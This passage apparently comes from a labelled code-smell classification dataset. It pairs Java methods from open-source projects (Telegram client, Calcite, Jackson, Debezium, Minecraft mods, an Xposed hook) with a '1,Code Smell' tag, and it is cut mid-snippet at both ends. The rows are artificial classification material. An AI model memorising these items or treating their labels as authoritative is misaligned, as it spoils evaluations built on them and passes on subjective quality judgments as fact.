 else     if (isMoreAndroidVersion(33)) {
      useCC=XposedHelpers.getBooleanField(XposedHelpers.getObjectField(param.thisObject,""mControlCenterController""),""useControlCenter"");
    }
 else {
      useCC=(boolean)XposedHelpers.callMethod(XposedHelpers.getObjectField(param.thisObject,""mControlCenterController""),""isExpandable"");
    }
    if (useCC) {
      MotionEvent motionEvent=(MotionEvent)param.args[0];
      if (motionEvent.getActionMasked() == 0) {
        if (isMoreHyperOSVersion(1f) && isAndroidVersion(34)) {
          XposedHelpers.setObjectField(param.thisObject,""downX"",motionEvent.getRawX());
        }
 else {
          XposedHelpers.setObjectField(param.thisObject,""mDownX"",motionEvent.getRawX());
        }
      }
      if (isMoreHyperOSVersion(1f) && isAndroidVersion(34)) {
        controlCenterWindowView=XposedHelpers.getObjectField(param.thisObject,""windowView"");
      }
 else {
        controlCenterWindowView=XposedHelpers.getObjectField(param.thisObject,""mControlPanel"");
      }
      if (controlCenterWindowView == null) {
        param.setResult(false);
      }
 else {
        float mDownX;
        if (isMoreHyperOSVersion(1f) && isAndroidVersion(34)) {
          mDownX=XposedHelpers.getFloatField(param.thisObject,""downX"");
        }
 else {
          mDownX=XposedHelpers.getFloatField(param.thisObject,""mDownX"");
        }
        float width=(float)param.args[1];
        if (mDownX < width / 2.0f) {
          param.setResult(XposedHelpers.callMethod(controlCenterWindowView,""handleMotionEvent"",motionEvent,true));
        }
 else {
          param.setResult(false);
        }
      }
      return;
    }
  }
  param.setResult(false);
}",1,Code Smell
"public void deserializeNBT(CompoundTag tag,BlockPos blockEntityPos,boolean clientPacket){
  CompoundTag connectionData=tag.getCompound(side.getName());
  if (connectionData.contains(""Pressure"")) {
    ListTag pressureData=connectionData.getList(""Pressure"",Tag.TAG_FLOAT);
    pressure=Couple.create(pressureData.getFloat(0),pressureData.getFloat(1));
  }
 else   pressure.replace(f -> 0f);
  source=Optional.empty();
  if (connectionData.contains(""OpenEnd""))   source=Optional.of(OpenEndedPipe.fromNBT(connectionData.getCompound(""OpenEnd""),blockEntityPos));
  if (connectionData.contains(""Flow"")) {
    CompoundTag flowData=connectionData.getCompound(""Flow"");
    FluidStack fluid=FluidStack.loadFluidStackFromNBT(flowData);
    boolean inbound=flowData.getBoolean(""In"");
    if (!flow.isPresent()) {
      flow=Optional.of(new Flow(inbound,fluid));
      if (clientPacket)       particleSplashNextTick=true;
    }
    Flow flow=this.flow.get();
    flow.fluid=fluid;
    flow.inbound=inbound;
    flow.complete=!flowData.contains(""Progress"");
    if (!flow.complete)     flow.progress.readNBT(flowData.getCompound(""Progress""),clientPacket);
 else {
      if (flow.progress.getValue() == 0)       flow.progress.startWithValue(1);
      flow.progress.setValue(1);
    }
  }
 else   flow=Optional.empty();
}",1,Code Smell
"private void updateProxyButton(boolean animated,boolean force){
  if (proxyDrawable == null || doneItem != null && doneItem.getVisibility() == View.VISIBLE) {
    return;
  }
  boolean showDownloads=false;
  for (int i=0; i < getDownloadController().downloadingFiles.size(); i++) {
    if (getFileLoader().isLoadingFile(getDownloadController().downloadingFiles.get(i).getFileName())) {
      showDownloads=true;
      break;
    }
  }
  if (NaConfig.INSTANCE.getAlwaysShowDownloadIcon().Bool()) {
    showDownloads=true;
  }
  if (!searching && (getDownloadController().hasUnviewedDownloads() || showDownloads || (downloadsItem.getVisibility() == View.VISIBLE && downloadsItem.getAlpha() == 1 && !force))) {
    downloadsItemVisible=true;
    downloadsItem.setVisibility(View.VISIBLE);
  }
 else {
    downloadsItem.setVisibility(View.GONE);
    downloadsItemVisible=false;
  }
  SharedPreferences preferences=ApplicationLoader.applicationContext.getSharedPreferences(""mainconfig"",Activity.MODE_PRIVATE);
  String proxyAddress=preferences.getString(""proxy_ip"","""");
  boolean proxyEnabled;
  proxyEnabled=preferences.getBoolean(""proxy_enabled"",false);
  if (!downloadsItemVisible && !NekoConfig.useProxyItem.Bool() && (!NekoConfig.hideProxyByDefault.Bool() || (proxyEnabled && !TextUtils.isEmpty(proxyAddress)) || getMessagesController().blockedCountry && !SharedConfig.proxyList.isEmpty())) {
    if (!actionBar.isSearchFieldVisible() && (doneItem == null || doneItem.getVisibility() != View.VISIBLE)) {
      proxyItem.setVisibility(View.VISIBLE);
    }
    proxyItemVisible=true;
    proxyDrawable.setConnected(true,currentConnectionState == ConnectionsManager.ConnectionStateConnected || currentConnectionState == ConnectionsManager.ConnectionStateUpdating,animated);
  }
 else {
    proxyItemVisible=false;
    proxyItem.setVisibility(View.GONE);
  }
}",1,Code Smell
"@Override public int compare(Customer o1,Customer o2){
  return o1.buy != o2.buy ? (o2.buy - o1.buy) : (o1.enterTime - o2.enterTime);
}
@Override public int compare(Customer o1,Customer o2){
  return o1.buy != o2.buy ? (o1.buy - o2.buy) : (o1.enterTime - o2.enterTime);
}
public static List<List<Integer>> compare(int[] arr,boolean[] op,int k){
  HashMap<Integer,Customer> map=new HashMap<>();
  ArrayList<Customer> cands=new ArrayList<>();
  ArrayList<Customer> daddy=new ArrayList<>();
  List<List<Integer>> ans=new ArrayList<>();
  for (int i=0; i < arr.length; i++) {
    int id=arr[i];
    boolean buyOrRefund=op[i];
    if (!buyOrRefund && !map.containsKey(id)) {
      ans.add(getCurAns(daddy));
      continue;
    }
    if (!map.containsKey(id)) {
      map.put(id,new Customer(id,0,0));
    }
    Customer c=map.get(id);
    if (buyOrRefund) {
      c.buy++;
    }
 else {
      c.buy--;
    }
    if (c.buy == 0) {
      map.remove(id);
    }
    if (!cands.contains(c) && !daddy.contains(c)) {
      if (daddy.size() < k) {
        c.enterTime=i;
        daddy.add(c);
      }
 else {
        c.enterTime=i;
        cands.add(c);
      }
    }
    cleanZeroBuy(cands);
    cleanZeroBuy(daddy);
    cands.sort(new CandidateComparator());
    daddy.sort(new DaddyComparator());
    move(cands,daddy,k,i);
    ans.add(getCurAns(daddy));
  }
  return ans;
}",1,Code Smell
"@Override protected void onDraw(Canvas canvas){
  if (isInEditMode()) {
    canvas.drawArc(oval,0,365,false,mPaint);
    return;
  }
  if (noShowLoading) {
    canvas.drawArc(oval,0,365,false,mPaint);
    successStep=2;
    drawDoneMark(status,canvas);
    return;
  }
switch (status) {
case STATUS_LOADING:
    float sweepAngle=(float)(halfSweepA * Math.sin(Math.toRadians(followRotateDegrees))) + halfSweepA + halfSweepAMinValue / 2;
  nowLoadingProgressValue=currentRotateDegrees - sweepAngle;
if (nowLoadingProgressValue < 0) {
  nowLoadingProgressValue=360 + nowLoadingProgressValue;
}
nowLoadingProgressEndAngle=sweepAngle;
changeStatusAngle=sweepAngle < 0 ? 360 - sweepAngle : sweepAngle;
canvas.drawArc(oval,currentRotateDegrees,-sweepAngle,false,mPaint);
break;
case STATUS_SUCCESS:
case STATUS_WARNING:
case STATUS_ERROR:
switch (successStep) {
case 0:
nowLoadingProgressEndAngle=nowLoadingProgressEndAngle + 5;
canvas.drawArc(oval,nowLoadingProgressValue,nowLoadingProgressEndAngle,false,mPaint);
if (nowLoadingProgressEndAngle - (360 - changeStatusAngle) >= nowLoadingProgressValue) {
successStep=1;
if (waitArticulationAnimationRunnable != null) {
waitArticulationAnimationRunnable.run();
waitArticulationAnimationRunnable=null;
}
}
break;
case 1:
canvas.drawArc(oval,0,360,false,mPaint);
drawDoneMark(status,canvas);
break;
}
break;
case STATUS_PROGRESSING:
switch (successStep) {
case 0:
canvas.drawArc(oval,-90,currentRotateDegrees,false,mPaint);
if (currentRotateDegrees == 365) {
successStep=1;
if (waitArticulationAnimationRunnable != null) {
waitArticulationAnimationRunnable.run();
waitArticulationAnimationRunnable=null;
}
}
break;
case 1:
canvas.drawArc(oval,0,360,false,mPaint);
drawDoneMark(status,canvas);
break;
}
}
}",1,Code Smell
"private void onPasswordForgot(){
  if (currentPassword.pending_reset_date == 0 && currentPassword.has_recovery) {
    needShowProgress(true);
    TLRPC.TL_auth_requestPasswordRecovery req=new TLRPC.TL_auth_requestPasswordRecovery();
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      needHideProgress();
      if (error == null) {
        final TLRPC.TL_auth_passwordRecovery res=(TLRPC.TL_auth_passwordRecovery)response;
        currentPassword.email_unconfirmed_pattern=res.email_pattern;
        TwoStepVerificationSetupActivity fragment=new TwoStepVerificationSetupActivity(currentAccount,TwoStepVerificationSetupActivity.TYPE_EMAIL_RECOVERY,currentPassword){
          @Override protected void onReset(){
            resetPasswordOnShow=true;
          }
        }
;
        fragment.addFragmentToClose(this);
        fragment.setCurrentPasswordParams(currentPasswordHash,currentSecretId,currentSecret,false);
        presentFragment(fragment);
      }
 else {
        if (error.text.startsWith(""FLOOD_WAIT"")) {
          int time=Utilities.parseInt(error.text);
          String timeString;
          if (time < 60) {
            timeString=LocaleController.formatPluralString(""Seconds"",time);
          }
 else {
            timeString=LocaleController.formatPluralString(""Minutes"",time / 60);
          }
          showAlertWithText(LocaleController.getString(""AppName"",R.string.AppName),LocaleController.formatString(""FloodWaitTime"",R.string.FloodWaitTime,timeString));
        }
 else {
          showAlertWithText(LocaleController.getString(""AppName"",R.string.AppName),error.text);
        }
      }
    }
),ConnectionsManager.RequestFlagFailOnServerErrors | ConnectionsManager.RequestFlagWithoutLogin);
  }
 else {
    if (getParentActivity() == null) {
      return;
    }
    if (currentPassword.pending_reset_date != 0) {
      if (getConnectionsManager().getCurrentTime() > currentPassword.pending_reset_date) {
        AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity());
        builder.setPositiveButton(LocaleController.getString(""Reset"",R.string.Reset),(dialog,which) -> resetPassword());
        builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
        builder.setTitle(LocaleController.getString(""ResetPassword"",R.string.ResetPassword));
        builder.setMessage(LocaleController.getString(""RestorePasswordResetPasswordText"",R.string.RestorePasswordResetPasswordText));
        AlertDialog dialog=builder.create();
        showDialog(dialog);
        TextView button=(TextView)dialog.getButton(DialogInterface.BUTTON_POSITIVE);
        if (button != null) {
          button.setTextColor(Theme.getColor(Theme.key_dialogTextRed));
        }
      }
 else {
        cancelPasswordReset();
      }
    }
 else {
      AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity());
      builder.setPositiveButton(LocaleController.getString(""Reset"",R.string.Reset),(dialog,which) -> resetPassword());
      builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
      builder.setTitle(LocaleController.getString(""ResetPassword"",R.string.ResetPassword));
      builder.setMessage(LocaleController.getString(""RestorePasswordNoEmailText2"",R.string.RestorePasswordNoEmailText2));
      showDialog(builder.create());
    }
  }
}",1,Code Smell
"public static int check(int[] nums){
  int count=0;
  Arrays.sort(nums);
  List<List<Integer>> res=new LinkedList<>();
  for (int i=0; i < nums.length - 2; i++) {
    if (i == 0 || nums[i] != nums[i - 1]) {
      int sum=0 - nums[i];
      int lo=i + 1, hi=nums.length - 1;
      while (lo < hi) {
        if (nums[lo] + nums[hi] == sum) {
          count++;
          res.add(Arrays.asList(nums[i],nums[lo],nums[hi]));
          while (lo < hi && nums[lo] == nums[lo + 1])           lo++;
          while (lo < hi && nums[hi] == nums[hi - 1])           hi--;
          lo++;
          hi--;
        }
 else         if (nums[lo] + nums[hi] < sum)         lo++;
 else         hi--;
      }
    }
  }
  return count;
}",1,Code Smell
"/** 
 * Adds an element to this lattice.
 */
@Override public boolean add(E e){
  assert e != null;
  assert !CalciteSystemProperty.DEBUG.value() || isValid(true);
  Node<E> node=map.get(e);
  if (node != null) {
    return false;
  }
  Set<Node<E>> parents=findParents(e);
  Set<Node<E>> children=findChildren(e);
  node=new Node<>(e);
  for (  Node<E> parent : parents) {
    node.parentList.add(parent);
    int n=0;
    for (int i=0; i < parent.childList.size(); i++) {
      Node<E> child=parent.childList.get(i);
      if (child.e == null || ordering.lessThan(child.e,e)) {
        if (parent.childList.contains(node)) {
          parent.childList.remove(i);
          --i;
        }
 else {
          parent.childList.set(i,node);
        }
        replace(child.parentList,parent,node);
        if (!node.childList.contains(child)) {
          node.childList.add(child);
        }
        ++n;
      }
    }
    if (n == 0) {
      parent.childList.add(node);
    }
  }
  final Set<Node<E>> childSet=new HashSet<>(node.childList);
  for (  Node<E> child : children) {
    if (!isDescendantOfAny(child,childSet)) {
      node.childList.add(child);
      if (!child.parentList.contains(node)) {
        child.parentList.add(node);
      }
    }
  }
  map.put(node.e,node);
  assert !CalciteSystemProperty.DEBUG.value() || isValid(true);
  return true;
}",1,Code Smell
"protected JsonSerializer<?> _createSerializer2(SerializerProvider prov,JavaType type,BeanDescription beanDesc,boolean staticTyping) throws JsonMappingException {
  JsonSerializer<?> ser=null;
  final SerializationConfig config=prov.getConfig();
  if (type.isContainerType()) {
    if (!staticTyping) {
      staticTyping=usesStaticTyping(config,beanDesc,null);
    }
    ser=buildContainerSerializer(prov,type,beanDesc,staticTyping);
    if (ser != null) {
      return ser;
    }
  }
 else {
    if (type.isReferenceType()) {
      ser=findReferenceSerializer(prov,(ReferenceType)type,beanDesc,staticTyping);
    }
 else {
      for (      Serializers serializers : customSerializers()) {
        ser=serializers.findSerializer(config,type,beanDesc);
        if (ser != null) {
          break;
        }
      }
    }
    if (ser == null) {
      ser=findSerializerByAnnotations(prov,type,beanDesc);
    }
  }
  if (ser == null) {
    ser=findSerializerByLookup(type,config,beanDesc,staticTyping);
    if (ser == null) {
      ser=findSerializerByPrimaryType(prov,type,beanDesc,staticTyping);
      if (ser == null) {
        ser=findBeanSerializer(prov,type,beanDesc);
        if (ser == null) {
          ser=findSerializerByAddonType(config,type,beanDesc,staticTyping);
          if (ser == null) {
            ser=prov.getUnknownTypeSerializer(beanDesc.getBeanClass());
          }
        }
      }
    }
  }
  if (ser != null) {
    if (_factoryConfig.hasSerializerModifiers()) {
      for (      BeanSerializerModifier mod : _factoryConfig.serializerModifiers()) {
        ser=mod.modifySerializer(config,beanDesc,ser);
      }
    }
  }
  return ser;
}",1,Code Smell
"/** 
 * Captures the  {@code enduser.*} semantic attributes from the given {@link Authentication} intothe  {@link LocalRootSpan} of the given {@link Context}. <p>Only the attributes enabled via the  {@code setEnduser*Enabled(true)} methods are captured.<p>The following attributes can be captured: <ul> <li> {@code enduser.id} - from {@link Authentication#getName()}<li> {@code enduser.role} - a comma-separated list from the {@link Authentication#getAuthorities()} with the configured {@link #getRoleGrantedAuthorityPrefix() role prefix}<li> {@code enduser.scope} - a comma-separated list from the {@link Authentication#getAuthorities()} with the configured {@link #getScopeGrantedAuthorityPrefix() scope prefix}</ul>
 * @param otelContext the context from which the {@link LocalRootSpan} in which to capture theattributes will be retrieved
 * @param authentication the authentication from which to determine the {@code enduser.*}attributes.
 */
public void captureEnduserAttributes(Context otelContext,Authentication authentication){
  if (authentication != null) {
    Span localRootSpan=LocalRootSpan.fromContext(otelContext);
    if (enduserIdEnabled && authentication.getName() != null) {
      localRootSpan.setAttribute(ENDUSER_ID,authentication.getName());
    }
    StringBuilder roleBuilder=null;
    StringBuilder scopeBuilder=null;
    if (enduserRoleEnabled || enduserScopeEnabled) {
      for (      GrantedAuthority authority : authentication.getAuthorities()) {
        String authorityString=authority.getAuthority();
        if (enduserRoleEnabled && authorityString.startsWith(roleGrantedAuthorityPrefix)) {
          roleBuilder=appendSuffix(roleGrantedAuthorityPrefix,authorityString,roleBuilder);
        }
 else         if (enduserScopeEnabled && authorityString.startsWith(scopeGrantedAuthorityPrefix)) {
          scopeBuilder=appendSuffix(scopeGrantedAuthorityPrefix,authorityString,scopeBuilder);
        }
      }
    }
    if (roleBuilder != null) {
      localRootSpan.setAttribute(ENDUSER_ROLE,roleBuilder.toString());
    }
    if (scopeBuilder != null) {
      localRootSpan.setAttribute(ENDUSER_SCOPE,scopeBuilder.toString());
    }
  }
}
",1,Code Smell
"private DenseMatrix matrixMultiplyTransposeBoth(Matrix other){
  if (dim1 == other.getDimension2Size()) {
    if (other instanceof DenseMatrix) {
      DenseMatrix otherDense=(DenseMatrix)other;
      double[][] output=new double[dim2][otherDense.dim1];
      for (int i=0; i < dim2; i++) {
        for (int j=0; j < otherDense.dim1; j++) {
          output[i][j]=rowColumnDot(i,j,otherDense);
        }
      }
      return new DenseMatrix(output);
    }
 else     if (other instanceof DenseSparseMatrix) {
      DenseSparseMatrix otherSparse=(DenseSparseMatrix)other;
      int otherDim1=otherSparse.getDimension1Size();
      double[][] output=new double[dim2][otherDim1];
      for (int i=0; i < dim2; i++) {
        for (int j=0; j < otherDim1; j++) {
          output[i][j]=rowColumnDot(i,j,otherSparse);
        }
      }
      return new DenseMatrix(output);
    }
 else {
      throw new IllegalArgumentException(""Unknown matrix type "" + other.getClass().getName());
    }
  }
 else {
    throw new IllegalArgumentException(""Invalid matrix dimensions, dim1 = "" + dim1 + "", other.dim2 = ""+ other.getDimension2Size());
  }
}",1,Code Smell
"private void setInfoViewVisibility(boolean visible){
  if (mCardType == CARD_TYPE_INFO_UNDER_WITH_EXTRA) {
    if (visible) {
      for (int i=0; i < mInfoViewList.size(); i++) {
        mInfoViewList.get(i).setVisibility(View.VISIBLE);
      }
    }
 else {
      for (int i=0; i < mInfoViewList.size(); i++) {
        mInfoViewList.get(i).setVisibility(View.GONE);
      }
      for (int i=0; i < mExtraViewList.size(); i++) {
        mExtraViewList.get(i).setVisibility(View.GONE);
      }
      mInfoOffset=0.0f;
    }
  }
 else   if (mCardType == CARD_TYPE_INFO_UNDER) {
    if (mInfoVisibility == CARD_REGION_VISIBLE_SELECTED) {
      animateInfoHeight(visible);
    }
 else {
      for (int i=0; i < mInfoViewList.size(); i++) {
        mInfoViewList.get(i).setVisibility(visible ? View.VISIBLE : View.GONE);
      }
    }
  }
 else   if (mCardType == CARD_TYPE_INFO_OVER) {
    animateInfoAlpha(visible);
  }
}",1,Code Smell
"public void uninstallShortcut(long dialogId){
  try {
    if (Build.VERSION.SDK_INT >= 26) {
      ArrayList<String> arrayList=new ArrayList<>();
      arrayList.add(""sdid_"" + dialogId);
      arrayList.add(""ndid_"" + dialogId);
      ShortcutManagerCompat.removeDynamicShortcuts(ApplicationLoader.applicationContext,arrayList);
      if (Build.VERSION.SDK_INT >= 30) {
        ShortcutManager shortcutManager=ApplicationLoader.applicationContext.getSystemService(ShortcutManager.class);
        shortcutManager.removeLongLivedShortcuts(arrayList);
      }
    }
 else {
      TLRPC.User user=null;
      TLRPC.Chat chat=null;
      if (DialogObject.isEncryptedDialog(dialogId)) {
        int encryptedChatId=DialogObject.getEncryptedChatId(dialogId);
        TLRPC.EncryptedChat encryptedChat=getMessagesController().getEncryptedChat(encryptedChatId);
        if (encryptedChat == null) {
          return;
        }
        user=getMessagesController().getUser(encryptedChat.user_id);
      }
 else       if (DialogObject.isUserDialog(dialogId)) {
        user=getMessagesController().getUser(dialogId);
      }
 else       if (DialogObject.isChatDialog(dialogId)) {
        chat=getMessagesController().getChat(-dialogId);
      }
 else {
        return;
      }
      if (user == null && chat == null) {
        return;
      }
      String name;
      if (user != null) {
        name=ContactsController.formatName(user.first_name,user.last_name);
      }
 else {
        name=chat.title;
      }
      Intent addIntent=new Intent();
      addIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT,createIntrnalShortcutIntent(dialogId));
      addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME,name);
      addIntent.putExtra(""duplicate"",false);
      addIntent.setAction(""com.android.launcher.action.UNINSTALL_SHORTCUT"");
      ApplicationLoader.applicationContext.sendBroadcast(addIntent);
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
}",1,Code Smell
"/** 
 * Build a signal for the cubic block grid centred on the player.<br> Default is 3x3x4. (One cube all around the player.)<br> Blocks are returned as a 1D array, in order along the x, then z, then y axes.<br> Data will be returned in an array called ""Cells"" Blocks are bit-packed into 32 bit int, see @getBlockInfo [0-11] block ID [12-15] block variant/meta [16] isCollidable [17] isToolNotRequired [18] blocksMovement [19] isLiquid [20] isSolid [21] getCanBurn [22] blocksLight
 * @param json a JSON object into which the info for the object under the mouse will be added.
 * @param environmentDimensions object which specifies the required dimensions of the grid to be returned.
 * @param jsonName name to use for identifying the returned JSON array.
 */
public static void buildGridData(JsonObject json,GridDimensions environmentDimensions,EntityPlayerMP player,String jsonName){
  if (player == null || json == null)   return;
  JsonArray arr=new JsonArray();
  BlockPos pos=new BlockPos(player.posX,player.posY,player.posZ);
  Vec3d head_pos=new Vec3d(player.posX,player.posY + (double)player.getEyeHeight(),player.posZ);
  if (environmentDimensions.projectDown) {
    for (int z=environmentDimensions.zMin; z <= environmentDimensions.zMax; z++) {
      for (int x=environmentDimensions.xMin; x <= environmentDimensions.xMax; x++) {
        for (int y=environmentDimensions.yMax; y >= environmentDimensions.yMin; y--) {
          BlockPos p;
          if (environmentDimensions.absoluteCoords)           p=new BlockPos(x,y,z);
 else           p=pos.add(x,y,z);
          IBlockState state=player.world.getBlockState(p);
          if (state.getMaterial() != Material.AIR)           continue;
          Vec3d blockPos=new Vec3d(p.getX(),p.getY(),p.getZ());
          float cosDist=(float)blockPos.subtract(head_pos).normalize().dotProduct(player.getLookVec().normalize());
          writeBlockInfo(arr,state,cosDist);
          break;
        }
      }
    }
  }
 else {
    for (int z=environmentDimensions.zMin; z <= environmentDimensions.zMax; z++) {
      for (int y=environmentDimensions.yMin; y <= environmentDimensions.yMax; y++) {
        for (int x=environmentDimensions.xMin; x <= environmentDimensions.xMax; x++) {
          BlockPos p;
          if (environmentDimensions.absoluteCoords)           p=new BlockPos(x,y,z);
 else           p=pos.add(x,y,z);
          IBlockState state=player.world.getBlockState(p);
          Vec3d blockPos=new Vec3d(p.getX(),p.getY(),p.getZ());
          float cosDist=(float)blockPos.subtract(head_pos).normalize().dotProduct(player.getLookVec().normalize());
          writeBlockInfo(arr,state,cosDist);
        }
      }
    }
  }
  json.add(jsonName,arr);
}",1,Code Smell
"public void implement(Implementor implementor){
  implementor.visitChild(0,getInput());
  if (!collation.getFieldCollations().isEmpty()) {
    final List<String> keys=new ArrayList<>();
    final List<RelDataTypeField> fields=getRowType().getFieldList();
    for (    RelFieldCollation fieldCollation : collation.getFieldCollations()) {
      final String name=fields.get(fieldCollation.getFieldIndex()).getName();
      keys.add(name + "": "" + direction(fieldCollation));
      if (false) {
switch (fieldCollation.nullDirection) {
case FIRST:
          break;
case LAST:
        break;
    }
  }
}
implementor.add(null,""{$sort: "" + Util.toString(keys,""{"","", "",""}"") + ""}"");
}
if (offset != null) {
implementor.add(null,""{$skip: "" + ((RexLiteral)offset).getValue() + ""}"");
}
if (fetch != null) {
implementor.add(null,""{$limit: "" + ((RexLiteral)fetch).getValue() + ""}"");
}
}",1,Code Smell
"public static void loadConfig(boolean force){
synchronized (sync) {
    if (configLoaded && !force) {
      return;
    }
    for (int i=0; i < configs.size(); i++) {
      ConfigItem o=configs.get(i);
      if (o.type == configTypeBool) {
        o.value=preferences.getBoolean(o.key,(boolean)o.defaultValue);
      }
      if (o.type == configTypeInt) {
        o.value=preferences.getInt(o.key,(int)o.defaultValue);
      }
      if (o.type == configTypeLong) {
        o.value=preferences.getLong(o.key,(Long)o.defaultValue);
      }
      if (o.type == configTypeFloat) {
        o.value=preferences.getFloat(o.key,(Float)o.defaultValue);
      }
      if (o.type == configTypeString) {
        o.value=preferences.getString(o.key,(String)o.defaultValue);
      }
      if (o.type == configTypeSetInt) {
        Set<String> ss=preferences.getStringSet(o.key,new HashSet<>());
        HashSet<Integer> si=new HashSet<>();
        for (        String s : ss) {
          si.add(Integer.parseInt(s));
        }
        o.value=si;
      }
      if (o.type == configTypeMapIntInt) {
        String cv=preferences.getString(o.key,"""");
        if (cv.length() == 0) {
          o.value=new HashMap<Integer,Integer>();
        }
 else {
          try {
            byte[] data=Base64.decode(cv,Base64.DEFAULT);
            ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(data));
            o.value=(HashMap<Integer,Integer>)ois.readObject();
            if (o.value == null) {
              o.value=new HashMap<Integer,Integer>();
            }
            ois.close();
          }
 catch (          Exception e) {
            o.value=new HashMap<Integer,Integer>();
          }
        }
      }
    }
    if (!configLoaded)     preferences.registerOnSharedPreferenceChangeListener(CloudSettingsHelper.listener);
    for (int a=1; a <= 5; a++) {
      datacenterInfos.add(new DatacenterInfo(a));
    }
    configLoaded=true;
  }
}",1,Code Smell
"/** 
 * Checks and validates the database's supplemental logging configuration as well as the lengths of the table and column names that are part of the database schema.
 * @param connection database connection, should not be {@code null}
 * @param pdbName pluggable database name, can be {@code null} when not using pluggabledatabases
 * @param schema connector's database schema, should not be {@code null}
 * @throws SQLException if a database exception occurred
 */
private void checkDatabaseAndTableState(OracleConnection connection,String pdbName,OracleDatabaseSchema schema) throws SQLException {
  final Instant start=Instant.now();
  LOGGER.trace(""Checking database and table state, this may take time depending on the size of your schema."");
  try {
    if (pdbName != null) {
      connection.setSessionToPdb(pdbName);
    }
    if (!isDatabaseAllSupplementalLoggingEnabled(connection)) {
      if (!isDatabaseMinSupplementalLoggingEnabled(connection)) {
        throw new DebeziumException(""Supplemental logging not properly configured. "" + ""Use: ALTER DATABASE ADD SUPPLEMENTAL LOG DATA"");
      }
      for (      TableId tableId : schema.tableIds()) {
        if (!connection.isTableExists(tableId)) {
          LOGGER.warn(""Database table '{}' no longer exists, supplemental log check skipped"",tableId);
        }
 else         if (!isTableAllColumnsSupplementalLoggingEnabled(connection,tableId)) {
          LOGGER.warn(""Database table '{}' not configured with supplemental logging \""(ALL) COLUMNS\""; "" + ""only explicitly changed columns will be captured. "" + ""Use: ALTER TABLE {}.{} ADD SUPPLEMENTAL LOG DATA (ALL) COLUMNS"",tableId,tableId.schema(),tableId.table());
        }
        final Table table=schema.tableFor(tableId);
        if (table == null) {
          throw new DebeziumException(""Unable to find table in relational model: "" + tableId);
        }
        checkTableColumnNameLengths(table);
      }
    }
 else {
      for (      TableId tableId : schema.tableIds()) {
        final Table table=schema.tableFor(tableId);
        if (table == null) {
          throw new DebeziumException(""Unable to find table in relational model: "" + tableId);
        }
        checkTableColumnNameLengths(table);
      }
    }
  }
  finally {
    if (pdbName != null) {
      connection.resetSessionToCdb();
    }
  }
  LOGGER.trace(""Database and table state check finished after {} ms"",Duration.between(start,Instant.now()).toMillis());
}
",1,Code Smell
"public Map<String,Result> getSecondaryResults(){
  Multimap<String,Result> allSecondary=new HashMultimap<>();
  for (  IterationResult ir : iterationResults) {
    Map<String,Result> secondaryResults=ir.getSecondaryResults();
    for (    Map.Entry<String,Result> entry : secondaryResults.entrySet()) {
      if (entry.getValue().getRole().isDerivative())       continue;
      allSecondary.put(entry.getKey(),entry.getValue());
    }
  }
  Map<String,Result> answers=new TreeMap<>();
  int totalIterations=iterationResults.size();
  for (  String label : allSecondary.keys()) {
    Collection<Result> results=allSecondary.get(label);
    Result firstResult=results.iterator().next();
    Result emptyResult=firstResult.getZeroResult();
    if (emptyResult != null) {
      for (int i=results.size(); i < totalIterations; i++) {
        allSecondary.put(label,emptyResult);
      }
    }
    @SuppressWarnings(""unchecked"") Aggregator<Result> aggregator=firstResult.getIterationAggregator();
    if (aggregator == null) {
      if (results.size() == 1) {
        answers.put(label,firstResult);
        continue;
      }
      throw new IllegalStateException(""No aggregator for "" + firstResult);
    }
    Result aggregate=aggregator.aggregate(allSecondary.get(label));
    answers.put(label,aggregate);
  }
  for (  String label : benchmarkResults.keys()) {
    Aggregator<Result> aggregator=null;
    Collection<Result> results=new ArrayList<>();
    for (    Result r : benchmarkResults.get(label)) {
      if (r.getRole().isSecondary() && !r.getRole().isDerivative()) {
        results.add(r);
        aggregator=r.getIterationAggregator();
      }
    }
    if (aggregator != null) {
      answers.put(label,aggregator.aggregate(results));
    }
  }
  answers.putAll(produceDerivative(getPrimaryResult()));
  Map<String,Result> adds=new HashMap<>();
  for (  Result r : answers.values()) {
    adds.putAll(produceDerivative(r));
  }
  answers.putAll(adds);
  return answers;
}",1,Code Smell
"public static String decode(String encoded){
  char[] encChars=encoded.toCharArray();
  char[] decChars=new char[encChars.length / 8 * 3];
  if (encChars.length % 8 != 0) {
    throw new IllegalArgumentException(""The length should be multiple of 8"");
  }
  final int PAD_IDX=DICT.length() - 1;
  int[] ibuf=new int[8];
  int[] obuf=new int[6];
  int oLen=0;
  int cut=0;
  for (int c=0; c < encChars.length / 8; c++) {
    for (int i=0; i < 8; i++) {
      ibuf[i]=DICT.indexOf(encChars[c * 8 + i]);
    }
    if (ibuf[3] == PAD_IDX) {
      for (int i=3; i < 8; i++) {
        ibuf[i]=0;
      }
      cut=2;
    }
 else     if (ibuf[6] == PAD_IDX) {
      for (int i=6; i < 8; i++) {
        ibuf[i]=0;
      }
      cut=1;
    }
    decodeStep(ibuf,obuf);
    decChars[oLen++]=(char)(obuf[0] + (obuf[1] << 8));
    decChars[oLen++]=(char)(obuf[2] + (obuf[3] << 8));
    decChars[oLen++]=(char)(obuf[4] + (obuf[5] << 8));
  }
  return new String(decChars,0,decChars.length - cut);
}",1,Code Smell
"/** 
 * Gets an  {@link ItemMapping} from the given {@link ItemStack}.
 * @param itemStack the itemstack
 * @return an item entry from the given java edition identifier
 */
@NonNull public ItemMapping getMapping(@NonNull ItemStack itemStack){
  return this.getMapping(itemStack.getId());
}
/** 
 * Gets an  {@link ItemMapping} from the given Minecraft: JavaEdition id.
 * @param javaId the id
 * @return an item entry from the given java edition identifier
 */
@NonNull public ItemMapping getMapping(int javaId){
  return javaId >= 0 && javaId < this.items.length ? this.items[javaId] : ItemMapping.AIR;
}
@NonNull public ItemMapping getMapping(Item javaItem){
  return getMapping(javaItem.javaId());
}
/** 
 * Gets an  {@link ItemMapping} from the given Minecraft: Java Editionblock state identifier.
 * @param javaIdentifier the block state identifier
 * @return an item entry from the given java edition identifier
 */
@Nullable public ItemMapping getMapping(String javaIdentifier){
